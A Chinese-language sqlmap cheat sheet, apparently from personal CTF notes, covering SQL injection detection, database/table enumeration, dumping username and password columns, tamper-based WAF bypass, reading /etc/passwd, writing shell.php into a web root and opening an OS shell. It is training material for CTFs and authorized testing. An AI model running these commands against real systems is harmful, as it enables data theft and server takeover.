---
title: "sqlmap"
draft: false
---
- 原始文档：[sqlmap.md](../../sqlmap/)
- 原文使用领域：CTF Web / SQL 注入
- 核心用途：自动化 SQL 注入检测与利用工具，可枚举库表、dump 数据、读写文件。
- 位置/入口：`/usr/bin/sqlmap`
- 当前状态：已在 Kali SSH 环境中确认

## 速查总结

sqlmap 是常用的自动化 SQL 注入检测与利用工具，适合在已经发现疑似注入点后，快速判断参数是否可注入，并进一步枚举数据库、表、字段和数据。

比赛或授权测试时的基本思路：

1. 先用浏览器、Burp Suite 或手工 payload 确认目标参数可控。
2. 再把完整请求交给 sqlmap，避免漏掉 Cookie、Token、POST 参数、特殊 Header。
3. 从轻量探测开始，逐步增加 `--dbs`、`--tables`、`--columns`、`--dump`。
4. 遇到 WAF、编码、重定向、登录态失效时，再补充 tamper、代理、延时、风险等级等参数。

常见能力：

- 检测 GET、POST、Cookie、Header 中的 SQL 注入点
- 判断数据库类型，如 MySQL、PostgreSQL、MSSQL、Oracle、SQLite
- 枚举数据库名、表名、字段名
- dump 指定表数据
- 读取数据库当前用户、当前库、权限、版本信息
- 在高权限场景下尝试文件读写、命令执行等高级操作

## 常用示例

### 从 Burp 请求包检测

把 Burp 抓到的完整 HTTP 请求保存为 `request.txt`，然后运行：

```bash
sqlmap -r request.txt --batch
```

参数说明：

- `-r request.txt`：从原始 HTTP 请求中读取目标、方法、参数、Cookie 和 Header
- `--batch`：自动选择默认选项，避免反复交互确认
- 适合有登录态、CSRF Token、复杂 POST 数据的目标

只测试某个参数：

```bash
sqlmap -r request.txt -p id --batch
```

请求里有多个参数时，建议先指定重点参数，减少误判和耗时：

```bash
sqlmap -r request.txt -p username,password --batch
```

### GET 参数检测

```bash
sqlmap -u "http://target/?id=1" -p id --dbs
```

参数说明：

- `-u`：指定目标 URL
- `-p id`：指定测试 `id` 参数
- `--dbs`：如果存在注入，枚举所有数据库

不指定 `-p` 时，sqlmap 会自动测试 URL 中的参数：

```bash
sqlmap -u "http://target/news.php?id=1&cat=2" --batch
```

### POST 表单检测

简单 POST 数据：

```bash
sqlmap -u "http://target/login.php" --data "username=admin&password=123456" --batch
```

指定测试某个 POST 参数：

```bash
sqlmap -u "http://target/login.php" --data "username=admin&password=123456" -p username --batch
```

带 Cookie：

```bash
sqlmap -u "http://target/user.php?id=1" --cookie "PHPSESSID=xxxx; token=yyyy" --batch
```

带自定义 Header：

```bash
sqlmap -u "http://target/api/user?id=1" -H "X-Forwarded-For: 127.0.0.1" --batch
```

## 枚举流程

### 1. 枚举数据库

```bash
sqlmap -r request.txt --dbs --batch
```

如果已经知道注入参数：

```bash
sqlmap -r request.txt -p id --dbs --batch
```

### 2. 枚举表

```bash
sqlmap -r request.txt -D database_name --tables --batch
```

### 3. 枚举字段

```bash
sqlmap -r request.txt -D database_name -T table_name --columns --batch
```

### 4. dump 指定表

```bash
sqlmap -r request.txt -D database_name -T table_name --dump --batch
```

### 5. dump 指定字段

```bash
sqlmap -r request.txt -D database_name -T users -C "id,username,password" --dump --batch
```

### 6. 只取部分数据

表很大时，先限制范围：

```bash
sqlmap -r request.txt -D database_name -T users --dump --start 1 --stop 10 --batch
```

也可以先统计数量：

```bash
sqlmap -r request.txt -D database_name -T users --count --batch
```

## 获取基础信息

当前数据库：

```bash
sqlmap -r request.txt --current-db --batch
```

当前数据库用户：

```bash
sqlmap -r request.txt --current-user --batch
```

数据库版本：

```bash
sqlmap -r request.txt --banner --batch
```

权限：

```bash
sqlmap -r request.txt --privileges --batch
```

所有用户：

```bash
sqlmap -r request.txt --users --batch
```

## 常用参数解释

### 目标输入

| 参数 | 作用 |
| --- | --- |
| `-u URL` | 指定目标 URL |
| `-r FILE` | 从 HTTP 请求包读取目标 |
| `--data DATA` | 指定 POST 请求体 |
| `--cookie COOKIE` | 指定 Cookie |
| `-H HEADER` | 添加单个 Header |
| `--headers HEADERS` | 添加多行 Header |
| `--method POST` | 强制指定请求方法 |

### 探测控制

| 参数 | 作用 |
| --- | --- |
| `-p PARAM` | 指定测试参数 |
| `--level N` | 测试等级，默认 1，范围 1-5 |
| `--risk N` | 风险等级，默认 1，范围 1-3 |
| `--dbms mysql` | 指定数据库类型，减少探测时间 |
| `--technique BEUSTQ` | 指定注入技术 |
| `--batch` | 自动使用默认选项 |
| `--flush-session` | 清理历史缓存，重新测试 |

`--technique` 常见取值：

- `B`：Boolean-based blind，布尔盲注
- `E`：Error-based，报错注入
- `U`：UNION query，联合查询注入
- `S`：Stacked queries，堆叠查询
- `T`：Time-based blind，时间盲注
- `Q`：Inline queries，内联查询

只测试时间盲注：

```bash
sqlmap -r request.txt --technique T --batch
```

### 数据枚举

| 参数 | 作用 |
| --- | --- |
| `--dbs` | 枚举数据库 |
| `-D DB` | 指定数据库 |
| `--tables` | 枚举表 |
| `-T TABLE` | 指定表 |
| `--columns` | 枚举字段 |
| `-C COLS` | 指定字段 |
| `--dump` | 导出数据 |
| `--count` | 统计表数据量 |
| `--where "条件"` | dump 时添加筛选条件 |

### 请求与网络

| 参数 | 作用 |
| --- | --- |
| `--proxy http://127.0.0.1:8080` | 通过 Burp 代理发送请求 |
| `--delay 1` | 每次请求间隔 1 秒 |
| `--timeout 10` | 请求超时时间 |
| `--retries 3` | 失败重试次数 |
| `--random-agent` | 使用随机 User-Agent |
| `--ignore-redirects` | 忽略重定向 |
| `--force-ssl` | 强制使用 HTTPS |

通过 Burp 观察 sqlmap 流量：

```bash
sqlmap -r request.txt --proxy http://127.0.0.1:8080 --batch
```

### 绕过与编码

| 参数 | 作用 |
| --- | --- |
| `--tamper SCRIPT` | 使用 tamper 脚本改写 payload |
| `--prefix PREFIX` | 为 payload 添加前缀 |
| `--suffix SUFFIX` | 为 payload 添加后缀 |
| `--skip-urlencode` | 不进行 URL 编码 |
| `--hex` | 使用十六进制方式处理数据 |
| `--safe-url URL` | 定期访问安全 URL，保持会话 |

查看可用 tamper 脚本：

```bash
ls /usr/share/sqlmap/tamper
```

常见 tamper 示例：

```bash
sqlmap -r request.txt --tamper space2comment --batch
```

多个 tamper 可以逗号分隔：

```bash
sqlmap -r request.txt --tamper space2comment,between,randomcase --batch
```

tamper 不是越多越好，脚本叠加可能导致 payload 变形，反而无法注入。比赛中通常先尝试一个，再根据响应调整。

## 实战流程

### 1. 抓包

在浏览器中正常访问目标功能，用 Burp Suite 抓取请求。尽量保留完整内容：

- 请求方法
- URL
- Cookie
- Content-Type
- POST Body
- CSRF Token
- Referer
- X-Requested-With 等 Ajax Header

保存为 `request.txt`。

### 2. 基础检测

```bash
sqlmap -r request.txt --batch
```

如果 sqlmap 提示某个参数可能存在注入，再围绕这个参数继续深入：

```bash
sqlmap -r request.txt -p id --batch
```

### 3. 枚举数据库

```bash
sqlmap -r request.txt -p id --dbs --batch
```

如果已经知道数据库类型，例如 MySQL：

```bash
sqlmap -r request.txt -p id --dbms mysql --dbs --batch
```

### 4. 找关键表

```bash
sqlmap -r request.txt -D ctf --tables --batch
```

常见值得关注的表名：

- `user`
- `users`
- `admin`
- `flag`
- `flags`
- `member`
- `account`
- `config`

### 5. 找关键字段

```bash
sqlmap -r request.txt -D ctf -T users --columns --batch
```

常见字段：

- `id`
- `username`
- `password`
- `passwd`
- `email`
- `token`
- `flag`

### 6. 导出指定数据

```bash
sqlmap -r request.txt -D ctf -T users -C "username,password" --dump --batch
```

## 常见场景

### 登录后的接口

登录后接口必须保留 Cookie。推荐使用 `-r`，不要只复制 URL：

```bash
sqlmap -r request.txt --batch
```

如果 Cookie 很快失效，需要重新抓包，或者使用浏览器中的最新 Cookie 替换请求包里的 Cookie。

### JSON 请求体

请求体示例：

```json
{"id":1,"name":"test"}
```

直接用 Burp 保存请求包，然后：

```bash
sqlmap -r request.txt -p id --batch
```

如果直接命令行传 JSON，注意 Shell 引号转义：

```bash
sqlmap -u "http://target/api/user" --data "{\"id\":1,\"name\":\"test\"}" -p id --batch
```

### Cookie 注入

如果怀疑 Cookie 参数可注入：

```bash
sqlmap -u "http://target/index.php" --cookie "id=1; PHPSESSID=xxxx" -p id --level 2 --batch
```

`--level` 提高后，sqlmap 会测试更多位置，包括 Cookie、Header 等。

### User-Agent / Referer 注入

测试 Header 注入通常需要提高 level：

```bash
sqlmap -r request.txt --level 3 --batch
```

指定测试 User-Agent：

```bash
sqlmap -r request.txt -p "User-Agent" --level 3 --batch
```

### 二次注入

二次注入指数据先被写入数据库，之后在另一个页面被查询并触发注入。sqlmap 可以用 `--second-url` 指定二次触发页面：

```bash
sqlmap -r request.txt --second-url "http://target/profile.php" --batch
```

### 时间盲注很慢

时间盲注通常请求多、速度慢。可以尝试：

```bash
sqlmap -r request.txt --technique T --time-sec 3 --threads 5 --batch
```

参数说明：

- `--time-sec 3`：设置时间盲注延迟判断秒数
- `--threads 5`：提高并发

线程太高可能导致目标不稳定，也可能造成误判。

## 高级功能

### 读取文件

在数据库权限足够时，可以尝试读取服务器文件：

```bash
sqlmap -r request.txt --file-read "/etc/passwd" --batch
```

Windows 目标示例：

```bash
sqlmap -r request.txt --file-read "C:/Windows/win.ini" --batch
```

### 写入文件

高权限场景下可以尝试写文件：

```bash
sqlmap -r request.txt --file-write shell.php --file-dest "/var/www/html/shell.php" --batch
```

这个能力依赖数据库权限、Web 目录可写权限、路径是否正确等条件。

### OS Shell

某些数据库和权限条件满足时，可以尝试：

```bash
sqlmap -r request.txt --os-shell --batch
```

CTF 中如果只是为了拿数据库里的 flag，通常不需要走到这一步。真实授权测试中也要谨慎控制影响范围。

## 输出位置

sqlmap 的结果通常保存在：

```bash
~/.local/share/sqlmap/output/
```

或旧版本目录：

```bash
~/.sqlmap/output/
```

查看某个目标的 dump 结果：

```bash
ls ~/.local/share/sqlmap/output/
```

## 常见问题排查

### 1. sqlmap 说没有注入

可能原因：

- 参数确实不可注入
- 请求包中的 Cookie 或 Token 过期
- 参数值不合适，没有进入目标 SQL 查询逻辑
- 目标有 WAF 或过滤
- 需要登录后访问
- 注入点在 Header、Cookie 或 JSON 内层参数中

处理方法：

```bash
sqlmap -r request.txt --flush-session --level 3 --risk 2 --batch
```

如果知道数据库类型：

```bash
sqlmap -r request.txt --dbms mysql --level 3 --risk 2 --batch
```

### 2. 一直 302 跳转登录页

说明登录态失效或请求包不完整。重新登录后抓包，确认请求中包含最新 Cookie。

也可以用 Burp 代理观察：

```bash
sqlmap -r request.txt --proxy http://127.0.0.1:8080 --batch
```

### 3. CSRF Token 变化

如果 Token 每次请求都变化，直接重放请求会失败。思路：

- 尽量抓取不会频繁变 Token 的接口
- 使用 Burp 观察失败原因
- 手工确认注入点后，再考虑编写脚本动态更新 Token

### 4. WAF 拦截

可以逐步尝试：

```bash
sqlmap -r request.txt --random-agent --batch
```

```bash
sqlmap -r request.txt --tamper space2comment --batch
```

```bash
sqlmap -r request.txt --tamper randomcase,space2comment --batch
```

不要一上来堆很多 tamper，先观察响应差异。

### 5. 结果来自缓存

sqlmap 会缓存目标测试结果。如果修改了请求、参数或 payload 后仍然结果异常，清缓存：

```bash
sqlmap -r request.txt --flush-session --batch
```

### 6. 中文、编码或特殊字符异常

可以尝试：

```bash
sqlmap -r request.txt --hex --batch
```

或检查请求包文件编码，确保没有被编辑器破坏换行、边界、中文参数。

## 比赛速用模板

### 模板 1：最稳的请求包方式

```bash
sqlmap -r request.txt --batch
sqlmap -r request.txt --dbs --batch
sqlmap -r request.txt -D 数据库名 --tables --batch
sqlmap -r request.txt -D 数据库名 -T 表名 --columns --batch
sqlmap -r request.txt -D 数据库名 -T 表名 --dump --batch
```

### 模板 2：已知参数名

```bash
sqlmap -r request.txt -p id --batch
sqlmap -r request.txt -p id --dbs --batch
sqlmap -r request.txt -p id -D 数据库名 --tables --batch
sqlmap -r request.txt -p id -D 数据库名 -T 表名 --dump --batch
```

### 模板 3：怀疑过滤

```bash
sqlmap -r request.txt -p id --level 3 --risk 2 --random-agent --batch
sqlmap -r request.txt -p id --tamper space2comment --batch
```

### 模板 4：时间盲注

```bash
sqlmap -r request.txt -p id --technique T --time-sec 3 --threads 5 --batch
```

## 注意事项

- 只在 CTF、靶场或明确授权的目标上使用。
- 真实业务系统中不要直接 `--dump` 大量数据，容易造成影响和越权风险。
- 优先使用 `-r` 请求包方式，能减少 Cookie、Header、POST 数据缺失导致的问题。
- 参数越多不代表越好，先小范围验证，再逐步加参数。
- 看到注入结果后，要回到浏览器或 Burp 中理解漏洞原因，避免只会跑工具。

## 备注

需要原始截图、旧笔记上下文或更完整的环境记录时，回看上面的原始文档。

